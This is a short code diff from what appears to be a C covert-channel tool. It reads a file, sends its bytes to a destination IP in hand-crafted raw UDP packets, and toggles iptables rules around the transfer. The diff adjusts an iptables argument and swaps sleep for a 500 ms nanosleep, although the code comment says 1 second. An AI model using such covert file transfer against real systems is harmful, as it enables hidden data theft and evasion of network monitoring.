@@ -57,7 +57,7 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     int max_delay = 1;
     double passed;
 
-    iptables(dip, true, PORT, false, false);
+    iptables(dip, tcp, PORT, false, false);
 
     if((file = fopen(filename, "rb")) == NULL) {
         perror("fopen can't open file");
@@ -79,7 +79,7 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
         covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, EOT);
     }
 
-    iptables(dip, true, PORT, false, true);
+    iptables(dip, tcp, PORT, false, true);
 
     fclose(file);
 }
@@ -107,6 +107,7 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
     int sending_socket;
     struct sockaddr_in sin;
     struct upseudo_header pseudo_header;
+    struct timespec delay, resume_delay;
     memset (datagram, 0, 4096);
 
     if((sending_socket= socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
@@ -117,7 +118,13 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
     struct iphdr *ip_header = (struct iphdr *) datagram;
     struct udphdr *udp_header = (struct udphdr *) (datagram + sizeof (struct iphdr));
 
-    sleep(1);
+    delay.tv_sec = 0;
+    delay.tv_nsec = 500000000L; //delay 1 sec
+    if(nanosleep(&delay, &resume_delay) < 0) {
+        perror("covert_send: nanosleep");
+        return;
+    }
+
 
     strcpy(source_ip , sip);
 
